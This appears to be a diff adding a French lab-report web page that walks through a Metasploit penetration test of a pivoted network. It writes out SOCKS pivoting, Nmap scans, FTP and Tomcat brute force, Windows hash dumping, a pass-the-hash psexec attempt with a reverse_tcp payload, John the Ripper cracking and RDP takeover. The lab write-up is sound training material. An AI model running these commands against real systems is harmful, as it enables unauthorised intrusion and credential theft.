+            </code></pre>
+          </figure>
+        </div>
+        <!--CE5-->
+        <img src="/assets/CE5-xaxV_oQX.png" width="750" />
+        <figcaption>
+          Figure 58 – Lancement du module socks_proxy
+        </figcaption>
+        <p>
+          Avant de lancer le module, l’attaquant doit configurer les paramètres du protocole
+          SOCKS qui est particulièrement utile pour rediriger du trafic TCP et UDP via un serveur intermédiaire
+          vers une autre adresse IP. Nous ne modifirons que le paramètre suivant:
+        </p>
+        <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
+          <li>
+            <strong>SRVHOST:</strong>: L’adresse locale du serveur proxy, ici 127.0.0.1, qui correspond à la machine
+              attaquante.
+          </li>
+        </ul>
+        <div class="center">
+          <figure class="ray-code">
+            <header class="ray-header">
+              <span class="dot red"></span>
+              <span class="dot yellow"></span>
+              <span class="dot green"></span>
+              <span class="title">bash</span>
+            </header>
+            <pre><code class="language-bash">
+msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
+msf6 auxiliary(server/socks_proxy) > run
+            </code></pre>
+          </figure>
+        </div>
+        <!--CE6-->
+        <img src="/assets/CE6-m_pM9zgj.png" width="750" />
+        <figcaption>
+          Figure 59 – Configuration du serveur proxy avec socks_proxy
+        </figcaption>
+            
+        <p>
+          Selon Metasploit 2nd Edition, l’outil <strong>ProxyChains</strong> est recommandé comme client SOCKS afin de
+          permettre à la machine attaquante de se connecter au serveur proxy que l’attaquant vient de
+          configurer.
+        </p>
+        <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
+          <li>Configuration du client du serveur SOCKS proxy</li>
+        </ul>
+            
+        <p>
+          Pour déclarer les paramètres du client SOCKS, il faut modifier le fichier proxychains4.conf 16
+          situé dans le répertoire /etc.
+        </p>
+        <div class="center">
+          <figure class="ray-code">
+            <header class="ray-header">
+              <span class="dot red"></span>
+              <span class="dot yellow"></span>
+              <span class="dot green"></span>
+              <span class="title">bash</span>
+            </header>
+            <pre><code class="language-bash">
+msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
+msf6 auxiliary(server/socks_proxy) > run
+            </code></pre>
+          </figure>
+        </div>
+        <!--CE7-->
+        <img src="/assets/CE7-BoGo4Nxk.png" width="750" />
+        <figcaption>
+          Figure 60 – Ouverture du fichier proxychains4.conf avec l’éditeur Nano
+        </figcaption>
+        <!--CE8-->
+        <img src="/assets/CE8-BN7Ga_Og.png" width="750" />
+        <figcaption>
+          Figure 61 – Ajout de la ligne socks5 127.0.0.1 1080 après les commentaires
+        </figcaption>
+        <p>
+          Le serveur proxy écoute maintenant par défaut sur le port 1080 de la machine attaquante. 
+          En utilisant l’outil Proxychains comme client avec Nmap, tout le trafic TCP et UDP généré par
+          Nmap passera par ProxyChains (via 127.0.0.1:1080) et sera acheminé vers le serveur proxy sur
+          l’hôte compromis, puis redirigé vers le réseau interne de l’entreprise.
+        </p>
+        <p>
+          Maintenant que la route est créée et que le serveur proxy est opérationnel, l’attaquant peut
+          envisager de lancer une attaque brute force sur l’un des services de l’ordinateur caché.
+        </p>
+        <!---->
+        <a href="#menu-rapport" class="btn" style="background: #38b4ff">
+          ⬅️ Revenir au menu du rapport
+        </a>
+      </div>
+            <!---->
+      <div class="section content-section" id="vulnérabilités">
+        <h2>🔍 Recherche de vulnérabilités avant intrusion</h2>
+        <p>
+          Le hacker doit d’abord identifier les services vulnérables exposés par la machine caché 
+          avant de pouvoir exploiter l’un de ces services en réalisant une attaque brute force qui 
+          selon la CNIL consiste à tester séquentiellement des couples composés 
+          d’un identifiant et d’un mot de passe sur l’invite de connexion d’un des services de 
+          la machine cachée.
+        </p>
+        <p>
+          En effet, les services du système d’exploitation sont accessibles via des ports et 
+          ces ports doivent être ouverts pour pouvoir être testés.
+        </p>
+        <!---->
+        <h3>1. Recherche des vulnérabilités avec Nmap via Proxychains</h3> 
+        <p>
+          Pour réaliser ce scanner des vulnérabilités, le hacker lance Nmap via le client Proxychains depuis le
+          terminal de commandes de Kali Linux à l’aide de la commande suivante:
+        </p> 
+        <!--CODE-->
+        <div class="center">
+                  <figure class="ray-code">
+                    <header class="ray-header">
+                      <span class="dot red"></span>
+                      <span class="dot yellow"></span>
+                      <span class="dot green"></span>
+                      <span class="title">bash</span>
+                    </header>
+                    <pre><code class="language-bash">$ sudo proxychains nmap -A -n -sT -Pn 192.168.100.3
+                    </code></pre>
+                  </figure>
+                </div>
+        <p>Selon nmap.org, l’option:</p>
+        <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
+          <li><strong>-A</strong>: Active la détection du système d’exploitation et des versions, le script scanning et la traceroute.</li>
+          <li><strong>-n</strong>: Ne jamais résoudre les noms des DNS</li>
+          <li><strong>-sT</strong>: Effectue un scan TCP Connect() complet</li>
+          <li><strong>-Pn</strong>: désactivation de la détection d’hôtes, l’hôte est considéré comme actif.</li>
+        </ul>
+        
+        <p>Ce scan volontairement bruyant a pour but d’évaluer l’état des 1000 ports TCP les plus couramment 
+          utilisé sur une machine.</p>
+        <!--CE1-->
+        <img src="/assets/CE1-CSRmpIgp.png" width="750" />
+        <figcaption>
+          Figure 62 – Scan de la machine avec Nmap via Proxychains
+        </figcaption>
+        <h3>Listes des vulnérabilités</h3>
+        <p>D’après l’extrait de scan, les ports TCP ouverts sont:</p>
+        <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
+          <li><strong>21</strong>: FTP</li>
+          <li><strong>22</strong>: SSH</li>
+          <li><strong>445</strong>: Microsoft SMB/Samba</li>
+          <li><strong>3306</strong>: MySQL</li>
+          <li><strong>8000</strong>: Applications HTTP et Serveurs Web</li>
+          <li><strong>8080</strong>: Outils de développement et Serveurs Web</li>
+        </ul>
+        
+        <p>À l’issue de ce scan, le hacker semble avoir l’embarras du choix car plusieurs services courants sont
+          ouverts. Il décide donc de s’essayer à une attaque par brute force sur le serveur FTP.</p>
+
+        <a href="#menu-rapport" class="btn" style="background: #38b4ff">
+          ⬅️ Revenir au menu du rapport
+        </a>
+      </div>
+      <!---->
+      <div class="section content-section" id="intrusion">
+        <h2>🔓 Tentative d'intrusion par Attaque Brute Force</h2>
+
+        <h3>1. Le serveur FTP est-il anonyme ?</h3>
+        
+        <!---->
+        <p>Avant de lancer notre attaque brute force sur le serveur FTP, assurons-nous qu’il ne soit pas
+        accessible en mode Anonyme.</p>
+        <p>Selon le site guide.ubuntu-fr.org, le mode Anonyme permet d’accéder au serveur en s’identifiant
+        avec un compte utilisateur dont les valeurs par défauts sont : « anonymous » ou « ftp » pour le
+        nom d’utilisateur et une adresse e-mail pour le mot de passe.</p>
+        <p>Nous utiliserons pour cela, le module ftp_version.</p>
+        <!--CODE-->
+        <div class="center">
+          <figure class="ray-code">
+            <header class="ray-header">
+              <span class="dot red"></span>
+              <span class="dot yellow"></span>
+              <span class="dot green"></span>
+              <span class="title">bash</span>
+            </header>
+            <pre><code class="language-bash">
+msf6 auxiliary(server/socks_proxy) > back
+msf6 auxiliary(server/socks_proxy) >
+msf6 > use auxiliaryscanner/ftp/ftp_version
+            </code></pre>
+          </figure>
+        </div>
+        <p>
+          On configure ce module avec l’adresse Ip de notre cible:
+          <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
+            <li>192.168.100.3</li>
+          </ul>
+        </p>
+        <!--CODE-->
+        <div class="center">
+          <figure class="ray-code">
+            <header class="ray-header">
+              <span class="dot red"></span>
+              <span class="dot yellow"></span>
+              <span class="dot green"></span>
+              <span class="title">bash</span>
+            </header>
+            <pre><code class="language-bash">
+msf6 auxiliary(scanner/ftp/ftp_version) > set RHOSTS 192.168.100.3
+msf6 auxiliary(scanner/ftp/ftp_version) > run
+            </code></pre>
+          </figure>
+        </div>
+          <!--CE1-->
+          <img src="/assets/CE2-Bp8rk7g2.png" width="850" />
+          <figcaption>
+            Figure 63 – Sélection du module ftp_version
+          </figcaption>
+          <!--CE2-->
+          <img src="/assets/CE2-Bp8rk7g2.png" width="850" />
+          <figcaption>
+            Figure 64 – Configuration et lancement du module ftp_version
+          </figcaption>
+          <p>La sortie obtenue ne montre pas le message "FTP Anonymous login allowed". Le mode anonyme n’est
+          pas activé sur le serveur FTP.</p>
+          <!--CE3-->
+          <img src="/assets/CE3-Ct8xguwJ.png" width="850" />
+          <figcaption>
+            Figure 65 – Le serveur FTP n’est pas anonyme
+          </figcaption>
+          <p>Le hacker devra donc procéder avec la méthode brute force s’il souhaite obtenir les identifiants
+          du serveur.</p>
+          <!---->
+          <h3>2. Attaque brute force sur le serveur FTP</h3>
+          <!---->
+          <p>Pour réaliser l’attaque par brute force, il faut d’abord sélectionner le dictionnaire de mots de
+          passe qui sera utilisé pour l’attaque.</p>
+          <p>Selon l’ouvrage Metasploit, 2nde édition, les dictionnaires sont disponibles dans le répertoire
+          /usr/share/wordlists, comme le montre la capture d’écran ci-dessous.</p>
+          <!--CE1-->
+          <img src="/assets/CE1-Css7pCJj.png" width="850" />
+          <figcaption>
+            Figure 66 – Répertoire contenant les dictionnaires de mots de passe
+          </figcaption>
+          <p>On sélectionne comme indiqué dans l’ouvrage le dictionnaire rockyou que l’on extrait de son
+          archive compressée au format gz à l’aide de la commande gunzip.</p>
+          <!--CODE-->
+          <div class="center">
+            <figure class="ray-code">
+              <header class="ray-header">
+                <span class="dot red"></span>
+                <span class="dot yellow"></span>
+                <span class="dot green"></span>
+                <span class="title">bash</span>
+              </header>
+              <pre><code class="language-bash">sudo gunzip /usr/share/wordlists/rockyou.txt.gz</code></pre>
+            </figure>
+          </div>
+          <!--CE2-->
+          <img src="/assets/CE2-DDvcEBuV.png" width="850" />
+          <figcaption>
+            Figure 67 – Extraction du dictionnaire rockyou de son archive
+          </figcaption>
+          <p>
+            Dans msf6, nous allons maintenant sélectionner le module ftp_login et le configurer comme suit:
+            <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
+              <li><strong>RHOSTS</strong>: adresse IP de la cible, 192.168.100.3</li>
+              <li><strong>USER_FILE et PASS_FILE</strong>: chemin vers le dictionnaire rockyou, soit /usr/share/wordlists/rockyou.txt.gz</li>
+            </ul>
+          </p>
+          <!--CODE-->
+          <div class="center">
+            <figure class="ray-code">
+              <header class="ray-header">
+                <span class="dot red"></span>
+                <span class="dot yellow"></span>
+                <span class="dot green"></span>
+                <span class="title">bash</span>
+              </header>
+              <pre><code class="language-bash">msf6 auxiliary(scanner/ftp/ftp_version) > back
+msf6 > use auxiliary/scanner/ftp/ftp_login
+msf6 auxiliary(scanner/ftp/ftp_login) > set RHOSTS 192.168.100.3
+msf6 auxiliary(scanner/ftp/ftp_login) > set USER_FILE
+/usr/share/wordlists/rockyou.txt
+msf6 auxiliary(scanner/ftp/ftp_login) > set PASS_FILE
+/usr/share/wordlists/rockyou.txt
+</code></pre>
+            </figure>
+          </div>
+          <!--CE3-->
+          <img src="/assets/CE3-BduAOR-Q.png" width="750" />
+          <figcaption>
+            Figure 68 – Configuration du module ftp_login de son archive
+          </figcaption>
+          <p>
+          <p>Après avoir configuré le module, celui-ci est lancé à l’aide de la commande <strong>run</strong>:</p>
+          <!--CODE-->
+          <div class="center">
+            <figure class="ray-code">
+              <header class="ray-header">
+                <span class="dot red"></span>
+                <span class="dot yellow"></span>
+                <span class="dot green"></span>
+                <span class="title">bash</span>
+              </header>
+              <pre><code class="language-bash">msf6 auxiliary(scanner/ftp/ftp_login) > run</code></pre>
+            </figure>
+          </div>
+          <!--CE4-->
+          <img src="/assets/CE4-B7Fle9Zi.png" width="750" />
+          <figcaption>
+            Figure 69 – Lancement de l’attaque par brute force sur le serveur FTP
+          </figcaption>
+          <p>Les premières tentatives se soldent par un échec comme on peut le voir sur la capture d’écran
+          ci-dessous.</p>
+          <!--CE5-->
+          <img src="/assets/CE5-DolfyYJo.png" width="750" />
+          <figcaption>
+            Figure 70 – Échec des premières combinaisons identifiant/mot de passe 
+          </figcaption>
+          <p>Après près de 48 heures d’exécution, l’attaquant se résout à abandonner, jugeant cette approche inefficace</p>
+          <!--CE6-->
+          <img src="/assets/CE6-BN3k913d.png" width="750" />
+          <figcaption>
+            Figure 71 – Abandon de l'attaque par Brute Force après 48 heures d’exécution
+          </figcaption>
+        </ol>
+        <p>L’idée retenue serait donc de tenter une attaque par brute force sur le serveur Tomcat.</p>
+        <h3>3. Attaque Brute Force sur le serveur TomCat</h3>
+        <!---->
+        <p>Dans msf6, nous allons maintenant rechercher le module <strong>apache tomcat</strong>:</p>
+        <!--CODE-->
+        <div class="center">
+            <figure class="ray-code">
+              <header class="ray-header">
+                <span class="dot red"></span>
+                <span class="dot yellow"></span>
+                <span class="dot green"></span>
+                <span class="title">bash</span>
+              </header>
+              <pre><code class="language-bash">msf6 auxiliary(scanner/ftp/ftp_login) > back
+msf6 > search apache tomcat
+msf6 > use auxiliary /scanner/http/tomcat_mgr_login
+</code></pre>
+            </figure>
+          </div>
+        <!--CE1-->
+        <img src="/assets/CE1-D-g27r8w.png" width="750" />
+        <figcaption>
+          Figure 72 – Recherche du module Apache Tomcat dans Metasploit
+        </figcaption>
+        <!--CE2-->
+        <img src="/assets/CE2-BfeOlGIO.png" width="750" />
+        <figcaption>
+          Figure 73 – Sélection du module tomcat_mgr_login
+        </figcaption>
+        <!--CE3-->
+        <img src="/assets/CE3-8AMg6a7V.png" width="750" />
+        <figcaption>
+          Figure 74 – Module prêt à être configuré
+        </figcaption>
+        <!---->
+        <p>
+          et le configurer comme suit:
+          <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
+            <li><strong>RHOSTS</strong>: adresse IP de la cible, 192.168.100.3</li>
+            <li><strong>THREADS</strong>: 50</li>
+            <li><strong>RPORT</strong>: 8180</li>
+            <li><strong>VERBOSE</strong>: false</li>
+            <li><strong>STOP_ON_SUCCESS</strong>: true</li>
+          </ul>
+        </p>
+        <!--CODE-->
+        <div class="center">
+            <figure class="ray-code">
+              <header class="ray-header">
+                <span class="dot red"></span>
+                <span class="dot yellow"></span>
+                <span class="dot green"></span>
+                <span class="title">bash</span>
+              </header>
+              <pre><code class="language-bash">msf6 auxiliary (scanner/http/tomcat_mgr_login) > set RHOSTS 192.168.100.3
+msf6 auxiliary (scanner/http/tomcat_mgr_login) > set THREADS 50
+msf6 auxiliary (scanner/http/tomcat_mgr_login) > set RPORT 8180
+msf6 auxiliary (scanner/http/tomcat_mgr_login) > set VERBOSE false
+msf6 auxiliary (scanner/http/tomcat_mgr_login) > set STOP_ON_SUCCESS false
+</code></pre>
+            </figure>
+          </div>
+        <!---->
+        <p>
+          Après avoir configuré le module, celui-ci est lancé à l’aide de la commande <strong>run</strong>:
+        </p>
+        <!--CODE-->
+        <div class="center">
+            <figure class="ray-code">
+              <header class="ray-header">
+                <span class="dot red"></span>
+                <span class="dot yellow"></span>
+                <span class="dot green"></span>
+                <span class="title">bash</span>
+              </header>
+              <pre><code class="language-bash">msf6 auxiliary (scanner/http/tomcat_mgr_login) > run</code></pre>
+            </figure>
+          </div>
+        <!--CE4-->
+        <img src="/assets/CE4-B5cSgim9.png" width="750" />
+        <figcaption>
+          Figure 75 – Interruption prématurée de l’attaque brute force sur Tomcat
+        </figcaption>
+        <p>L’interruption brutale de l’attaque, avant même son démarrage effectif, pousse le hacker à vérifier
+        l’accessibilité du port du service.</p>
+        <!--CODE-->
+        <div class="center">
+            <figure class="ray-code">
+              <header class="ray-header">
+                <span class="dot red"></span>
+                <span class="dot yellow"></span>
+                <span class="dot green"></span>
+                <span class="title">bash</span>
+              </header>
+              <pre><code class="language-bash">proxychains nmap -sS -Pn -p 8180 192.168.100.3</code></pre>
+            </figure>
+          </div>
+        <p>
+          Selon le site <a href="https://nmap.org/book/man-briefoptions.html">nmap.org</a>, les options utilisées sont:
+          <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
+            <li><strong>-sS</strong>: effectue un scan SYN des ports (il s’agit d’un scan furtif c’est à dire sans lancer la détection
+            du système d’exploitation ni des versions, ni de scripts ou traceroute)</li>
+            <li><strong>-Pn</strong>: désactive la phase de découverte de l’hôte (il n’y aura donc pas de ping)</li>
+            <li><strong>-p</strong>: permet de spécifier le ou les port(s) à scanner, ici le port à scanner est le port 8180.</li>
+          </ul>
+        </p>
+        <!--CE5-->
+        <img src="/assets/CE5-Ca6tSj6Z.png" width="750" />
+        <figcaption>
+          Figure 76 – Le port 8180 semble bloqué par un pare-feu
+        </figcaption>
+        <!---->
+        <p>La sortie affichée dans le terminal Kali ci-dessus, montre que le port 8180 a le statut filtered, ce
+        qui indique qu’il est probablement filtré ou bloqué par un pare-feu.</p>
+        
+       
+        <p>Les tentatives d’intrusion sur les serveurs FTP et Tomcat par brute force se sont soldées par des
+          échecs, soit parce que le temps nécessaire pour deviner la bonne combinaison identifiant/mot de passe
+          était trop long, soit parce que le port était tout simplement bloqué par un pare-feu.</p>
+        <a href="#menu-rapport" class="btn" style="background: #38b4ff">
+          ⬅️ Revenir au menu du rapport
+        </a>
+      </div>
+      <!---->
+      <div class="section content-section" id="usurpation">
+        <h2>🔓 Tentative d'intrusion par usurpation des mots de passe système</h2>
+        <!---->
+        <p>
+          Le pirate adopte désormais une autre stratégie : l’usurpation de l’ensemble des mots de passe
+          système de la machine déjà compromise, à savoir le serveur Windows Server 2008 R2 Standard.
+          Pour ce faire, il utilisera le module post-exploitation <strong>smart_hashdump</strong>.
+        </p>
+        <!--CODE-->
+        <div class="center">
+          <figure class="ray-code">
+            <header class="ray-header">
+              <span class="dot red"></span>
+              <span class="dot yellow"></span>
+              <span class="dot green"></span>
+              <span class="title">bash</span>
+            </header>
+            <pre><code class="language-bash">msf6 > sessions
+msf6 > sessions -i 1
+</code></pre>
+            </figure>
+          </div>
+        <!--CE1-->
+        <img src="/assets/CE1-HGELtCXR.png" width="750" />
+        <figcaption>
+          Figure 77 – Récupération du numéro de session et connexion à la session avec la commande sessions
+        </figcaption>
+        <h3>1. 💻 Extraction des hachages des noms d’utilisateur et des mots de passe du système avec le module <strong>smart_hashdump</strong>.</h3>
+        <p>Une fois connecté, il charge l’extension priv afin d’activer les privilèges administrateur dans Meterpreter, ce qui lui permet d’extraire 
+          les hachages des noms d’utilisateur et mots de passe du système.</p>
+        <!--CODE-->
+        <div class="center">
+          <figure class="ray-code">
+            <header class="ray-header">
+              <span class="dot red"></span>
+              <span class="dot yellow"></span>
+              <span class="dot green"></span>
+              <span class="title">bash</span>
+            </header>
+            <pre><code class="language-bash">meterpreter > use priv</code></pre>
+          </figure>
+        </div>
+        <!--CE2-->
+        <img src="/assets/CE2-7fetid2r.png" width="750" />
+        <figcaption>
+          Figure 78 – Chargement de l’extension priv
+        </figcaption>
+        <p>Selon les auteurs de l’ouvrage Metasploit: The Penetration Tester’s Guide, 2e édition, ces hachages
+          correspondent à la forme chiffrée de ces informations, conformément aux protocoles LAN Manager
+          (LM), NT LAN Manager (NTLM) et NT LAN Manager v2 (NTLMv2).</p>
+        <!--CODE-->
+        <div class="center">
+          <figure class="ray-code">
+            <header class="ray-header">
+              <span class="dot red"></span>
+              <span class="dot yellow"></span>
+              <span class="dot green"></span>
+              <span class="title">bash</span>
+            </header>
+            <pre><code class="language-bash">meterpreter > run post/windows/gather/smart_hashdump</code></pre>
+          </figure>
+        </div>
+        <!--CE3-->
+        <img src="/assets/CE3-CD9SDYB7.png" width="750" />
+        <figcaption>
+          Figure 79 – Extraction des noms d’utilisateur et de leurs mots de passe hachés depuis le registre
+        </figcaption>
+        <h3>2. 🎯 Recours à la technique « pass the hash »</h3>
+        <p>
+          L’utilisation de cette technique est rendu possible du fait de l’existence d’une faille 17 dans la
+          conception du protocole NTLM qui accepte les hachages du mot de passe de l’utilisateur peut se faire
+          passer pour lui.
+        </p>
+        <p>
+          Le pirate va donc utiliser le module windows/smb/psexec pour réaliser cette attaque.
+        </p>
+        <!--CODE-->
+        <div class="center">
+          <figure class="ray-code">
+            <header class="ray-header">
+              <span class="dot red"></span>
+              <span class="dot yellow"></span>
+              <span class="dot green"></span>
+              <span class="title">bash</span>
+            </header>
+            <pre><code class="language-bash">meterpreter > background
+msf6 > use exploit/windows/smb/psexec
+</code></pre>
+          </figure>
+        </div>
+        <p>Il le configure comme suit:</p>
+          <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
+            <li><strong>PAYLOAD</strong>: code malveillant exécuté sur la cible après exploitation.</li>
+            <li><strong>LHOST</strong>: adresse IP de la machine Windows 2008 intermédiaire utilisée comme point de pivot vers la machine cachée.</li>
+            <li><strong>LPORT</strong>: 443</li>
+            <li><strong>RHOST</strong>: adresse IP de la machine cachée (192.168.100.3).</li>
+            <li><strong>SMBUser</strong>: nom d’utilisateur présent dans la base des comptes compromis.</li>
+             <li><strong>SMBPass</strong>: hachage NTLM correspondant à l’utilisateur choisi.</li>
+          </ul>
+        
+        <!--CODE-->
+        <div class="center">
+          <figure class="ray-code">
+            <header class="ray-header">
+              <span class="dot red"></span>
+              <span class="dot yellow"></span>
+              <span class="dot green"></span>
+              <span class="title">bash</span>
+            </header>
+            <pre><code class="language-bash">msf6 exploit(psexec)> set PAYLOAD windows/meterpreter/reverse_tcp
+msf6 exploit(psexec)> set SESSION 1
+msf6 exploit(psexec)> set LPORT 443
+msf6 exploit(psexec)> set RHOST 192.168.100.3
+msf6 exploit(windows/smb/psexec) > set SMBUser Administrator
+msf6 exploit(psexec)> set SMBPass aad3b435b51404eeaad3b435b51404ee:
+e02bc503339d51f71d913c245d35b50b
+msf6 exploit(psexec)> exploit
+</code></pre>
+          </figure>
+        </div>
+        <!--CE1-->
+        <img src="/assets/CE1-CSWzl62Q.png" width="750" />
+        <figcaption>
+          Figure 80 – Echec de l’exploit avec la technique « pass the hash »
+        </figcaption>
+        <p>La technique « pass the hash » n’ayant pas abouti, le pirate décide alors de tenter de décoder les mots
+        de passes hachés à l’aide du logiciel de cassage de mots de passe, <strong>John the Ripper</strong>.</p>
+        <!---->
+        <h3>3. 🔓 Décryptage des hachages de mots de passes avec John the Ripper</h3>
+        <p>
+          John the Ripper est un logiciel libre conçu pour évaluer la solidité des mots de passe en tentant de
+          les casser. Il utilise principalement des attaques par dictionnaire.
+          Selon <a href="https://fr.wikipedia.org/wiki/John_the_Ripper">Wikipédia</a>, ce programme reconnaît automatiquement le type de hachage employé (MD5, NTLM,
+          SHA-2, etc) et en plus d’offrir un large choix d’algorithmes d’attaque permet de relancer une attaque
+          qui a été interrompue.
+        </p>
+        <!---->
+        <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
+          <li>Identification du fichier contenant les mots de passes hachés</li>
+        </ul>
+        <p>
+          Depuis Metasploit, le pirate saisit la commande creds qui permet de gérer les identifiants trouvés 
+          et utilisés pour les machines ciblées.
+        </p>
+        <!--CODE-->
+        <div class="center">
+          <figure class="ray-code">
+            <header class="ray-header">
+              <span class="dot red"></span>
+              <span class="dot yellow"></span>
+              <span class="dot green"></span>
+              <span class="title">bash</span>
+            </header>
+            <pre><code class="language-bash">msf6 > creds</code></pre>
+          </figure>
+        </div>
+        <!--CE2-->
+        <img src="/assets/CE2--gdr0tgp.png" width="750" />
+        <figcaption>
+          Figure 81 – Sortie de la commande creds
+        </figcaption>
+        <p>
+          En examinant la sortie de la commande creds, le pirate remarque que trois entrées correspondent
+          à la machine cachée (192.168.100.3). Il va donc utiliser la commande grep pour filtrer et afficher
+          uniquement les informations relatives à ces entrées.
+        </p>
+        <!--CODE-->
+        <div class="center">
+          <figure class="ray-code">
+            <header class="ray-header">
+              <span class="dot red"></span>
+              <span class="dot yellow"></span>
+              <span class="dot green"></span>
+              <span class="title">bash</span>
+            </header>
+            <pre><code class="language-bash">msf6 > grep 192.168.100.3 creds</code></pre>
+          </figure>
+        </div>
+        <!--CE3-->
+        <img src="/assets/CE3-CSvptPBC.png" width="750" />
+      <figcaption>
+        Figure 82 – Filtrage de la commande creds à l’aide de la commande grep
+      </figcaption>
+      <p>
+        La commande loot lui permet ensuite de localiser le fichier contenant les noms d’utilisateurs et
+        leurs mot de passe hachés.
+      </p>
+      <!--CODE-->
+      <div class="center">
+        <figure class="ray-code">
+          <header class="ray-header">
+            <span class="dot red"></span>
+            <span class="dot yellow"></span>
+            <span class="dot green"></span>
+            <span class="title">bash</span>
+          </header>
+          <pre><code class="language-bash">msf6 > loot</code></pre>
+        </figure>
+      </div>
+      <!--CE4-->
+      <img src="/assets/CE4-Djm6plcI.png" width="750" />
+      <figcaption>
+        Figure 83 – Localisation du fichier contenant les noms d’utilisateur et leurs mots de passes hachés avec la commande loot
+      </figcaption>
+      <p>
+        Pour préparer l’attaque avec John the Ripper, le pirate copie ce fichier vers le dossier Documents
+        avec la commande <strong>cp</strong>.
+      </p>
+      <!--CODE-->
+      <div class="center">
+        <figure class="ray-code">
+          <header class="ray-header">
+            <span class="dot red"></span>
+            <span class="dot yellow"></span>
+            <span class="dot green"></span>
+            <span class="title">bash</span>
+          </header>
+          <pre><code class="language-bash">msf6 > cp /root/.msf4/loot/20250812163411_default_10.10.10.2_windows.hashes_283651.txt
+/home/vagrant/Documents
+</code></pre>
+        </figure>
+      </div>
+      <!--CE5-->
+      <img src="/assets/CE5-Clpr1xgO.png" width="750" />
+      <figcaption>
+        Figure 84 – Copie du fichier contenant les noms d’utilisateurs et leurs mot de passe hachés vers le dossier Documents
+      </figcaption>
+      <!---->
+      <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
+        <li>Cassage des mots de passe hachés avec John the Ripper</li>
+      </ul>
+      <p>
+        Pour lancer le cassage des mots de passes hachés contenus dans le fichier, le pirate saisit la
+        commande suivante:
+      </p>
+      <!--CODE-->
+      <div class="center">
+        <figure class="ray-code">
+          <header class="ray-header">
+            <span class="dot red"></span>
+            <span class="dot yellow"></span>
+            <span class="dot green"></span>
+            <span class="title">bash</span>
+          </header>
+          <pre><code class="language-bash">$ john --format=NT ~/Documents/20250812163411_default_10.10.10.2_windows.hashes_283651.txt</code></pre>
+        </figure>
+      </div>
+      <!--CE1-->
+      <img src="/assets/CE1-BiZ4cmm1.png" width="750" />
+      <figcaption>
+        Figure 81 – Cassage des mots de passe hachés à l’aide de l’option –format
+      </figcaption>
+      <p>À l’aide de l’option <strong>-show</strong>, l’attaquant peut désormais afficher les mots de passe en clair:</p>
+      <!--CODE-->
+      <div class="center">
+        <figure class="ray-code">
+          <header class="ray-header">
+            <span class="dot red"></span>
+            <span class="dot yellow"></span>
+            <span class="dot green"></span>
+            <span class="title">bash</span>
+          </header>
+          <pre><code class="language-bash">$ john --show --format=NT 
+~/Documents/20250812163411_default_10.10.10.2_windows.hashes_283651.txt</code></pre>
+        </figure>
+      </div>
+      <!--CE2-->
+      <img src="/assets/CE2-DGjaeGY3.png" width="750" />
+      <figcaption>
+        Figure 82 – Affichage des mots de passes hachés en clair à l’aide de l’option –show
+      </figcaption>
+      <p>
+        Le pirate constate que l’utilisateur vagrant est présent à la fois sur la machine Windows 2008
+        (10.10.10.2) et sur la machine cachée (192.168.100.3).
+        Ce compte sera donc utilisé pour tenter une connexion au serveur FTP.
+      </p>
+      <p>
+        Pour cela, le pirate active à distance une session sur la machine Windows 2008 via le Meterpreter
+        puis saisit manuellement les identifiants trouvés pour se connecter au serveur FTP.
+      </p>   
+      
+      <a href="#menu-rapport" class="btn" style="background: #38b4ff">
+        ⬅️ Revenir au menu du rapport
+      </a>
+    </div>
+      <!---->
+      <div class="section content-section" id="graphique">
+        <h2>💻 Activation du contrôle à distance en mode graphique sur la machine compromise</h2>
+        <!---->
+        <p>Le pirate souhaite établir une session graphique à distance sur la machine compromise. Pour ce
+        faire, il commence par identifier le numéro de session afin de s’y connecter.</p>
+        <!---->
+        <h3>1. Accès au serveur FTP depuis la machine compromise</h3>
+        <p>Les commandes suivantes sont exécutées:</p>
+        <!--CODE-->
+        <div class="center">
+          <figure class="ray-code">
+            <header class="ray-header">
+              <span class="dot red"></span>
+              <span class="dot yellow"></span>
+              <span class="dot green"></span>
+              <span class="title">bash</span>
+            </header>
+            <pre><code class="language-bash">msf6 > sessions
+msf6 > sessions -i 1
+</code></pre>
+          </figure>
+        </div>
+        <!--CE1-->
+        <img src="/assets/CE1-Dzb8rJtY.png" width="750" />
+        <figcaption>
+          Figure 83 – Récupération du numéro de session et connexion à la session avec la commande <strong>sessions</strong>
+        </figcaption>
+        <p>
+          Une fois connecté, il charge le module enable_rdp, qui active le Bureau à distance via le protocole
+          RDP. Selon les auteurs de Metasploit: The Penetration Tester’s Guide, 2e édition, ce module permet de
+          créer un tunnel pour la communication graphique et d’interagir avec le bureau de la cible.
+        </p>
+        <!--CODE-->
+        <div class="center">
+          <figure class="ray-code">
+            <header class="ray-header">
+              <span class="dot red"></span>
+              <span class="dot yellow"></span>
+              <span class="dot green"></span>
+              <span class="title">bash</span>
+            </header>
+            <pre><code class="language-bash">meterpreter > run post/windows/manage/enable_rdp</code></pre>
+          </figure>
+        </div>
+        <!--CE2-->
+        <img src="/assets/CE2-BpIlsiA9.png" width="750" />
+        <figcaption>
+          Figure 84 – Activation du Bureau à distance avec <strong>enable_rdp</strong>
+        </figcaption>
+        <p>Depuis le terminal Kali Linux, il utilise ensuite les identifiants du compte vagrant pour tenter
+          une connexion graphique au Bureau distant de la machine Windows 2008 compromise avec l’outil
+          rdesktop:
+        </p>
+        <!--CODE-->
+        <div class="center">
+          <figure class="ray-code">
+            <header class="ray-header">
+              <span class="dot red"></span>
+              <span class="dot yellow"></span>
+              <span class="dot green"></span>
+              <span class="title">bash</span>
+            </header>
+            <pre><code class="language-bash">$: sudo rdesktop 10.10.10.2 -u vagrant -p vagrant</code></pre>
+          </figure>
+        </div>
+        <!--CE3-->
+        <img src="/assets/CE3-DdK0q3CG.png" width="750" />
+        <figcaption>
+          Figure 85 – Connexion graphique au Bureau distant via <strong>rdesktop</strong>
+        </figcaption>
